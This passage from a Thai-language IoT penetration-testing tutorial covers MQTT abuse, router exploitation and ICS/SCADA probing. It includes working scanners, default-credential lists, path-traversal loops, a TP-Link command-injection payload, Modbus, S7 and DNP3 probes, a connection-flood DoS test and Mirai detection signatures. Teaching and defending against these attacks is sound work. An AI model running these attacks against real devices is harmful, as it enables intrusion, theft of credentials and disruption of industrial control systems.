        self._analyze_messages(messages)
        
        return messages
    
    def _analyze_messages(self, messages: List[Dict]):
        """วิเคราะห์ MQTT messages หา sensitive data"""
        import re
        
        sensitive_patterns = [
            (r'(?i)password[\s]*[=:][\s]*[\S]+', 'Password'),
            (r'(?i)token[\s]*[=:][\s]*[A-Za-z0-9]+', 'Token'),
            (r'(?i)credit.?card|cc.?number', 'Credit Card'),
            (r'\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b', 'Card Number'),
        ]
        
        print("\n[*] Sensitive data in MQTT traffic:")
        for msg in messages:
            for pattern, label in sensitive_patterns:
                if re.search(pattern, msg['payload']):
                    print(f"  [!] {label} in topic: {msg['topic']}")
                    print(f"      Payload: {msg['payload'][:100]}")
    
    def test_topic_injection(self, base_topic: str) -> List[str]:
        """ทดสอบ topic injection"""
        client = mqtt.Client()
        client.connect(self.host, self.port)
        
        injection_topics = [
            # Path traversal
            base_topic + '/../admin',
            base_topic + '/%2F..%2Fadmin',
            # Special chars
            base_topic + '/+',   # single level wildcard
            '#',                  # all topics
            '$SYS',               # system info
            '$SYS/broker/clients/connected',
            '$SYS/broker/version',
        ]
        
        accessible = []
        for topic in injection_topics:
            try:
                received = []
                
                def on_message(c, ud, msg):
                    received.append(msg)
                
                client.on_message = on_message
                client.subscribe(topic)
                client.loop(timeout=2)
                
                if received:
                    print(f"[+] Accessible topic: {topic}")
                    accessible.append(topic)
            except Exception:
                pass
        
        client.disconnect()
        return accessible
    
    def publish_malicious(self, topic: str, payload: str) -> bool:
        """Publish malicious payload"""
        client = mqtt.Client()
        
        try:
            client.connect(self.host, self.port)
            result = client.publish(topic, payload, qos=1)
            client.disconnect()
            
            if result.rc == 0:
                print(f"[+] Published to {topic}: {payload[:50]}")
                return True
        except Exception as e:
            print(f"[-] Publish failed: {e}")
        
        return False
    
    def test_dos(self, num_connections: int = 1000):
        """ทดสอบ DoS vulnerability (ระวัง: ทดสอบเฉพาะบน lab เท่านั้น!)"""
        print(f"[*] Testing DoS with {num_connections} connections...")
        clients = []
        
        def connect_spam():
            try:
                c = mqtt.Client()
                c.connect(self.host, self.port)
                clients.append(c)
            except Exception:
                pass
        
        threads = []
        for i in range(min(num_connections, 100)):  # จำกัดที่ 100
            t = threading.Thread(target=connect_spam)
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join(timeout=2)
        
        print(f"[+] Created {len(clients)} connections")
        
        # Cleanup
        for c in clients:
            try:
                c.disconnect()
            except Exception:
                pass
```

---

## 9. Router/Gateway Hacking

### 9.1 Router Exploitation Framework

```bash
# ================================================
# Router Security Assessment
# ================================================

# 1. Discover router model
nmap -sV 192.168.1.1
curl -s http://192.168.1.1/ | grep -i 'version\|model\|firmware'

# 2. ค้นหา CVEs
# ค้นใน https://cve.mitre.org
# ค้นใน https://www.exploit-db.com

# 3. RouterSploit - Framework สำหรับ router
pip3 install routersploit
rsf
# rsf > use scanners/autopwn
# rsf > set target 192.168.1.1
# rsf > run

# ================================================
# Manual Router Testing
# ================================================

ROUTER="192.168.1.1"

# ดู open ports
nmap -sV -O $ROUTER

# Test default credentials (HTTP Basic Auth)
curl -u admin:admin http://$ROUTER/
curl -u admin:password http://$ROUTER/
curl -u admin:1234 http://$ROUTER/

# Test authentication bypass
curl http://$ROUTER/admin/ -H 'Authorization: Basic '
curl http://$ROUTER/setup.cgi

# Test HNAP (Home Network Administration Protocol)
curl -X POST http://$ROUTER/HNAP1/ \
  -H 'SOAPAction: "http://purenetworks.com/HNAP1/GetDeviceSettings"' \
  -d '<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope ...>...</soap:Envelope>'

# Test UPnP
curl http://$ROUTER:5000/rootDesc.xml
upnpc -s  # ดู UPnP services
upnpc -l  # list port mappings

# Test DNS Rebinding
# ถ้า router ไม่มี DNS rebinding protection
# สามารถ attack ผ่าน browser ได้

# ================================================
# Extract configuration
# ================================================

# ดู configuration backup
curl -u admin:admin http://$ROUTER/backup.cfg
curl -u admin:admin http://$ROUTER/config.bin
curl -u admin:admin http://$ROUTER/romfile.cfg

# Decode TP-Link config
python3 -c "
import base64, zlib
with open('backup.bin', 'rb') as f:
    data = f.read()
# TP-Link uses XOR encryption with key 0xA5
decoded = bytes([b ^ 0xA5 for b in data[4:]])
print(zlib.decompress(decoded).decode('utf-8'))
"

# ================================================
# Path Traversal บน routers
# ================================================

# Common vulnerable paths
for path in \
    '../../../etc/passwd' \
    '..%2F..%2F..%2Fetc%2Fpasswd' \
    '/etc/passwd' \
    '../../proc/self/environ'
do
    echo "Testing: $path"
    curl -s "http://$ROUTER/cgi-bin/download?file=$path" | \
        head -5
done
```

### 9.2 Python Router Scanner

```python
#!/usr/bin/env python3
# router_scanner.py - Automated Router Vulnerability Scanner

import requests
import json
from typing import Dict, List, Optional

requests.packages.urllib3.disable_warnings()

class RouterScanner:
    """Automated Router Security Scanner"""
    
    FINGERPRINTS = {
        'TP-Link': [
            ('title', 'TP-LINK'),
            ('header', 'Server: TP-LINK'),
        ],
        'Netgear': [
            ('title', 'NETGEAR'),
            ('body', 'NETGEAR'),
        ],
        'D-Link': [
            ('title', 'D-Link'),
            ('body', 'D-Link'),
        ],
        'ASUS': [
            ('title', 'ASUS'),
            ('body', 'ASUS Router'),
        ],
        'MikroTik': [
            ('header', 'MikroTik'),
            ('body', 'RouterOS'),
        ],
    }
    
    VULNERABILITIES = {
        'Netgear': [
            {
                'cve': 'CVE-2017-5521',
                'test': lambda s, t: s._test_netgear_auth_bypass(t),
                'desc': 'Authentication bypass via password recovery'
            },
        ],
        'TP-Link': [
            {
                'cve': 'CVE-2021-41653',
                'test': lambda s, t: s._test_tplink_rce(t),
                'desc': 'RCE via DNS lookup'
            },
        ],
    }
    
    def __init__(self, target: str):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.brand = None
    
    def fingerprint(self) -> Optional[str]:
        """ระบุ router brand"""
        try:
            response = self.session.get(self.target, timeout=5)
            
            for brand, checks in self.FINGERPRINTS.items():
                for check_type, value in checks:
                    if check_type == 'title':
                        if value.lower() in response.text.lower():
                            self.brand = brand
                            return brand
                    elif check_type == 'header':
                        for header_val in response.headers.values():
                            if value.lower() in str(header_val).lower():
                                self.brand = brand
                                return brand
                    elif check_type == 'body':
                        if value.lower() in response.text.lower():
                            self.brand = brand
                            return brand
        except Exception:
            pass
        return None
    
    def _test_netgear_auth_bypass(self, target: str) -> bool:
        """CVE-2017-5521 Netgear auth bypass"""
        try:
            r = self.session.get(
                f"{target}/passwordrecovery.cgi?id=test",
                timeout=5
            )
            if 'password' in r.text.lower() and r.status_code == 200:
                print(f"[!] Netgear auth bypass might work!")
                return True
        except Exception:
            pass
        return False
    
    def _test_tplink_rce(self, target: str) -> bool:
        """CVE-2021-41653 TP-Link RCE"""
        try:
            # Test for vulnerability
            r = self.session.get(
                f"{target}/cgi-bin/luci/;stok=/locale",
                params={'form': 'country', 'operation': 'write',
                        'country_name': '$(id > /tmp/cmd_test)'},
                timeout=5
            )
            # ตรวจสอบ result
            r2 = self.session.get(
                f"{target}/cgi-bin/luci/;stok=/locale",
                params={'form': 'country', 'operation': 'read'},
                timeout=5
            )
            if 'uid=' in r2.text or 'root' in r2.text:
                print("[!] TP-Link RCE confirmed!")
                return True
        except Exception:
            pass
        return False
    
    def scan(self) -> Dict:
        """Full scan"""
        print(f"[*] Scanning router: {self.target}")
        results = {'target': self.target, 'vulnerabilities': [], 'info': {}}
        
        # Fingerprint
        brand = self.fingerprint()
        print(f"[+] Brand: {brand or 'Unknown'}")
        results['info']['brand'] = brand
        
        # Test brand-specific vulns
        if brand and brand in self.VULNERABILITIES:
            for vuln in self.VULNERABILITIES[brand]:
                print(f"[*] Testing {vuln['cve']}: {vuln['desc']}")
                if vuln['test'](self, self.target):
                    results['vulnerabilities'].append(vuln)
        
        # Generic tests
        self._test_default_creds(results)
        self._test_info_disclosure(results)
        
        return results
    
    def _test_default_creds(self, results: Dict):
        """Test default credentials"""
        creds = [
            ('admin', 'admin'), ('admin', 'password'),
            ('admin', '1234'), ('admin', ''), ('root', '')
        ]
        
        for user, passwd in creds:
            try:
                r = self.session.get(
                    self.target,
                    auth=(user, passwd),
                    timeout=5
                )
                if r.status_code == 200 and 'logout' in r.text.lower():
                    print(f"[!] Default creds: {user}:{passwd}")
                    results['vulnerabilities'].append({
                        'type': 'Default Credentials',
                        'value': f"{user}:{passwd}"
                    })
                    break
            except Exception:
                pass
    
    def _test_info_disclosure(self, results: Dict):
        """Test information disclosure"""
        paths = [
            '/info.html', '/status.html', '/board.html',
            '/setup.htm', '/debug.htm',
        ]
        
        for path in paths:
            try:
                r = self.session.get(f"{self.target}{path}", timeout=3)
                if r.status_code == 200 and len(r.text) > 100:
                    print(f"[+] Info page found: {path}")
                    results['vulnerabilities'].append({
                        'type': 'Information Disclosure',
                        'path': path
                    })
            except Exception:
                pass
```

---

## 10. Industrial Control Systems (ICS/SCADA)

### 10.1 ICS/SCADA Overview

```
ICS/SCADA Architecture:

┌─────────────────────────────────────────┐
│           Enterprise Network            │
│         (IT - Business Systems)         │
└─────────────────┬───────────────────────┘
                  │ DMZ / Firewall
┌─────────────────┴───────────────────────┐
│         Operations Network              │
│   ┌─────────────┐  ┌─────────────────┐  │
│   │     HMI     │  │   Historian     │  │
│   │(Operator UI)│  │  (Data Logger)  │  │
│   └─────────────┘  └─────────────────┘  │
└─────────────────┬───────────────────────┘
                  │ Control Bus
┌─────────────────┴───────────────────────┐
│           Control Network               │
│   ┌─────────────┐  ┌─────────────────┐  │
│   │    SCADA    │  │      DCS        │  │
│   │   Server    │  │ (Distributed    │  │
│   │             │  │  Control Sys)   │  │
│   └──────┬──────┘  └────────┬────────┘  │
└──────────┼──────────────────┼───────────┘
           │ Field Bus        │
    ┌──────┴──────┐    ┌──────┴──────┐
    │    PLCs     │    │    RTUs     │
    │(Programmable│    │(Remote Term)│
    │Logic Ctrl)  │    │             │
    └──────┬──────┘    └─────────────┘
           │
    ┌──────┴──────┐
    │Field Devices│
    │ Sensors,    │
    │ Actuators   │
    └─────────────┘
```

### 10.2 ICS Protocol Testing

```python
#!/usr/bin/env python3
# ics_scanner.py - ICS/SCADA Security Scanner

import socket
import struct
from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ModbusException
from typing import List, Dict

class ICSScanner:
    """ICS/SCADA Security Scanner"""
    
    def __init__(self, target: str):
        self.target = target
        self.findings = []
    
    def scan_modbus(self, port: int = 502) -> Dict:
        """Scan Modbus protocol"""
        print(f"[*] Scanning Modbus on {self.target}:{port}")
        result = {'protocol': 'Modbus', 'reachable': False, 'data': {}}
        
        try:
            client = ModbusTcpClient(self.target, port=port)
            
            if client.connect():
                result['reachable'] = True
                print(f"[+] Modbus connected!")
                
                # อ่าน coils (digital outputs)
                coils = client.read_coils(0, 10)
                if not coils.isError():
                    result['data']['coils'] = coils.bits[:10]
                    print(f"    Coils: {coils.bits[:10]}")
                
                # อ่าน discrete inputs
                dinputs = client.read_discrete_inputs(0, 10)
                if not dinputs.isError():
                    result['data']['discrete_inputs'] = dinputs.bits[:10]
                
                # อ่าน holding registers (สำคัญ!)
                registers = client.read_holding_registers(0, 10)
                if not registers.isError():
                    result['data']['holding_registers'] = registers.registers
                    print(f"    Holding Registers: {registers.registers}")
                
                # ทดสอบ write (อันตราย - ทำในกับ lab เท่านั้น!)
                # write_result = client.write_register(0, 0xBEEF)
                # if not write_result.isError():
                #     print("[!] WRITE ACCESS! Can control PLC outputs!")
                #     self.findings.append({'type': 'Modbus Write Access', 'severity': 'CRITICAL'})
                
                client.close()
        except Exception as e:
            print(f"[-] Error: {e}")
        
        return result
    
    def scan_s7_protocol(self, port: int = 102) -> Dict:
        """Scan Siemens S7 protocol (SNAP7)"""
        print(f"[*] Scanning S7 on {self.target}:{port}")
        result = {'protocol': 'S7', 'reachable': False}
        
        try:
            # สร้าง S7 COTP connection request
            cotp_connect = bytes([
                0x03, 0x00, 0x00, 0x16,  # TPKT
                0x11,                      # COTP length
                0xe0, 0x00, 0x00,          # CR
                0x00, 0x01, 0x00,          # dst, src, class
                0xc0, 0x01, 0x0a,          # option
                0xc1, 0x02, 0x01, 0x00,    # src TSAP
                0xc2, 0x02, 0x01, 0x02,    # dst TSAP (rack 0, slot 2)
            ])
            
            sock = socket.create_connection((self.target, port), timeout=5)
            sock.send(cotp_connect)
            response = sock.recv(1024)
            
            if len(response) > 4 and response[5] == 0xd0:  # CC = Connection Confirm
                result['reachable'] = True
                print(f"[+] S7 Protocol accessible!")
                
                # อ่าน device info
                s7_request = bytes([
                    0x03, 0x00, 0x00, 0x19,  # TPKT
                    0x02, 0xf0, 0x80,         # COTP
                    0x32, 0x01, 0x00, 0x00,   # S7 header
                    0x00, 0x00, 0x00, 0x08,   # length
                    0x00, 0x00, 0xf0, 0x00,   # request
                    0x00, 0x01, 0x00, 0x01,
                    0x01, 0xe0,
                ])
                
                sock.send(s7_request)
                info_response = sock.recv(1024)
                result['raw_response'] = info_response.hex()
            
            sock.close()
        except Exception as e:
            print(f"[-] Error: {e}")
        
        return result
    
    def scan_dnp3(self, port: int = 20000) -> Dict:
        """Scan DNP3 protocol (Power/Water systems)"""
        print(f"[*] Scanning DNP3 on {self.target}:{port}")
        result = {'protocol': 'DNP3', 'reachable': False}
        
        # DNP3 Data Link Layer request
        dnp3_request = bytes([
            0x05, 0x64,  # start bytes
            0x05,        # length
            0xC4,        # control (DIR, PRM, UNS, FCB, FCV)
            0xFF, 0xFF,  # destination (broadcast)
            0x01, 0x00,  # source address
            0x00,        # checksum
        ])
        
        try:
            sock = socket.create_connection((self.target, port), timeout=5)
            sock.send(dnp3_request)
            response = sock.recv(1024)
            
            if len(response) >= 2 and response[0] == 0x05 and response[1] == 0x64:
                result['reachable'] = True
                print(f"[+] DNP3 accessible!")
                
                self.findings.append({
                    'type': 'DNP3 Accessible',
                    'severity': 'HIGH',
                    'detail': 'DNP3 (Power/Water control) is accessible without authentication'
                })
            
            sock.close()
        except Exception:
            pass
        
        return result
    
    def full_scan(self) -> Dict:
        """Scan all ICS protocols"""
        results = {
            'target': self.target,
            'protocols': []
        }
        
        # Scan each protocol
        results['protocols'].append(self.scan_modbus())
        results['protocols'].append(self.scan_s7_protocol())
        results['protocols'].append(self.scan_dnp3())
        
        results['findings'] = self.findings
        
        # Summary
        accessible = [p for p in results['protocols'] if p.get('reachable')]
        print(f"\n[*] ICS Scan Complete")
        print(f"    Accessible protocols: {len(accessible)}")
        for p in accessible:
            print(f"    [+] {p['protocol']}")
        
        return results
```

---

## 11. IoT Botnet Analysis

### 11.1 Mirai Botnet Analysis

```python
#!/usr/bin/env python3
# botnet_analyzer.py - IoT Botnet Traffic Analysis

import scapy.all as scapy
from scapy.layers.inet import TCP, UDP, IP, ICMP
from collections import defaultdict
from typing import Dict, List
import time

class IoTBotnetDetector:
    """ตรวจจับ IoT Botnet activity"""
    
    # Mirai default credentials
    MIRAI_CREDENTIALS = [
        ('root', 'xc3511'),
        ('root', 'vizxv'),
        ('root', 'admin'),
        ('admin', 'admin'),
        ('root', '888888'),
        ('root', 'xmhdipc'),
        ('root', 'default'),
        ('root', 'juantech'),
        ('admin', 'password'),
    ]
    
    # C2 communication indicators
    C2_PORTS = [23, 48101, 103, 7547]
    SCAN_PORTS = [23, 2323, 80, 8080, 7547]
    
    def __init__(self):
        self.connections = defaultdict(list)
        self.port_scans = defaultdict(set)
        self.telnet_attempts = []
        self.c2_connections = []
    
    def analyze_pcap(self, pcap_file: str) -> Dict:
        """วิเคราะห์ PCAP file สำหรับ botnet indicators"""
        print(f"[*] Analyzing: {pcap_file}")
        
        packets = scapy.rdpcap(pcap_file)
        
        for pkt in packets:
            if IP not in pkt:
                continue
            
            src = pkt[IP].src
            dst = pkt[IP].dst
            
            if TCP in pkt:
                dport = pkt[TCP].dport
                sport = pkt[TCP].sport
                
                # ตรวจสอบ Telnet scanning (Mirai)
                if dport == 23:
                    self.port_scans[src].add(dst)
                
                # ตรวจสอบ port scanning pattern
                if dport in self.SCAN_PORTS:
                    self.connections[src].append((dst, dport))
                
                # ตรวจสอบ C2 communication
                if dport in self.C2_PORTS and len(pkt[TCP].payload) > 0:
                    payload = bytes(pkt[TCP].payload)
                    if any(cred[0].encode() in payload 
                           for cred in self.MIRAI_CREDENTIALS):
                        self.c2_connections.append({
                            'src': src, 'dst': dst, 'port': dport
                        })
        
        return self._generate_report()
    
    def _generate_report(self) -> Dict:
        """สร้าง analysis report"""
        report = {
            'potential_bots': [],
            'port_scanners': [],
            'c2_connections': self.c2_connections,
            'indicators': []
        }
        
        # หา heavy scanners (Mirai scans ไวมาก)
        for src, destinations in self.port_scans.items():
            if len(destinations) > 20:  # scan >20 hosts = suspicious
                report['port_scanners'].append({
                    'ip': src,
                    'targets_scanned': len(destinations)
                })
                report['indicators'].append(
                    f"SCANNER: {src} scanned {len(destinations)} IPs on port 23"
                )
        
        # หา C2 connections
        if self.c2_connections:
            report['indicators'].append(
                f"C2: {len(self.c2_connections)} potential C2 connections found"
            )
        
        return report


# Mirai source code indicators (สำหรับ detection)
MIRAI_SIGNATURES = {
    'string_table': [
        b'/proc/net/tcp',
        b'/proc/net/route',
        b'echo -e "\\x47\\x4c\\x42"',
        b'wget -q -O-',
        b'/dev/null',
    ],
    'behaviors': [
        'Telnet scanning on port 23/2323',
        'Self-replication via default credentials',
        'DDoS via UDP/TCP/HTTP flood',
        'Process name spoofing',
        'Killing competing malware',
    ]
}
```

---

## 12. สรุปและ Lab Exercises

### 12.1 IoT Security Tools Reference

| Tool | Category | Purpose |
|------|----------|---------|
| **binwalk** | Firmware | Extract and analyze firmware |
| **firmwalker** | Firmware | Search extracted filesystem |
| **firmadyne** | Firmware | Full system emulation |
| **QEMU** | Emulation | Binary/system emulation |
| **RouterSploit** | Exploitation | Router-specific exploits |
| **mosquitto** | MQTT | MQTT client/broker |
| **MQTT Explorer** | MQTT | Visual MQTT browser |
| **OpenOCD** | Hardware | JTAG debugging |
| **flashrom** | Hardware | Flash chip programming |
| **pymodbus** | ICS | Modbus protocol library |
| **Saleae** | Hardware | Logic analyzer software |
| **KillerBee** | Zigbee | Zigbee analysis |

### 12.2 IoT Lab Exercises

```
Level 1: Basic
- Setup DVID (Damn Vulnerable IoT Device) สำหรับ practice
  https://github.com/Vulcainreo/DVID
- Extract firmware ด้วย binwalk
- ค้นหา hardcoded credentials
- Connect กับ UART console

Level 2: Intermediate
- Setup Mosquitto MQTT broker
- ทดสอบ anonymous access
- Intercept MQTT messages
- Setup fake AP สำหรับ MitM

Level 3: Advanced
- Emulate IoT firmware ด้วย QEMU
- Exploit vulnerable web interface
- Analyze Modbus protocol
- Reverse engineer IoT binary

Level 4: Expert
- JTAG firmware extraction
- Custom exploit development
- ICS/SCADA lab setup
- Botnet traffic analysis
```

### 12.3 สรุป

| หัวข้อ | ความครอบคลุม |
|--------|-------------|
| IoT Attack Surface | Hardware, Firmware, Network, Cloud |
| OWASP IoT Top 10 | ช่องโหว่ที่พบบ่อย |
| Firmware Analysis | binwalk, extraction, secrets |
| Hardware Hacking | UART, JTAG, SPI flash |
| Protocol Testing | MQTT, Modbus, S7, DNP3 |
| Router Security | Default creds, CVEs, RCE |
| ICS/SCADA | Industrial system security |
| Botnet Detection | Mirai signatures, traffic analysis |

---

← [Part 79: Mobile Security](Part-79-Mobile-Security.md) | [Part 81: Wireless Security Advanced](Part-81-Wireless-Security-Advanced.md) →
